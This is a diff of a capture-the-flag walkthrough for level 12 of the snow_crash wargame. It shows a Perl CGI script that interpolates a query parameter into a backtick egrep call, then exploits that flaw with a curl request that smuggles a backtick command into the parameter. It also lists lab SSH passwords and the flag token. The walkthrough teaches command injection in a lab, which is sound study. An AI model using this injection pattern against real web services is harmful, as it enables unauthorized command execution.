@@ -1,5 +1,47 @@
-Level09 - snow_crash
+Level12 - snow_crash
 
-Connect with the previous password "25749xKZ8L7DkSCwJkT9dyv6f"
-	ssh -p 4242 level09@192.168.1.20 
+Connect with the previous password "fa6v5ateaw21peobuub8ipe6s"
+	ssh -p 4242 level12@192.168.1.20 
 
+We see a perl script with this inside
+
+	#!/usr/bin/env perl
+	# localhost:4646
+	use CGI qw{param};
+	print "Content-type: text/html\n\n";
+
+	sub t {
+	  $nn = $_[1];
+	  $xx = $_[0];
+	  $xx =~ tr/a-z/A-Z/;						#change all lowcase to upcase
+	  $xx =~ s/\s.*//;							#substitue every whitespace and other character that comme 
+	  @output = `egrep "^$xx" /tmp/xd 2>&1`;	#will search for all match with "^$xx" in the file /tmp/xd
+	  foreach $line (@output) {					
+	      ($f, $s) = split(/:/, $line);			
+	      if($s =~ $nn) {
+	          return 1;
+	      }
+	  }
+	  return 0;
+	}
+
+	sub n {
+	  if($_[0] == 1) {
+	      print("..");
+	  } else {
+	      print(".");
+	  }
+	}
+
+	n(t(param("x"), param("y")));
+
+It a server that listen on port 4646 and get two parameter, x and y.
+We could use the line where output is asigned to execute a command. 
+
+	cd /tmp
+	printf '#!/bin/bash\ngetflag > /tmp/flag' > GETFLAG
+	chmod +x /tmp/GETFLAG
+	curl localhost:4646?x='`/*/GETFLAG`'
+	cat flag 
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
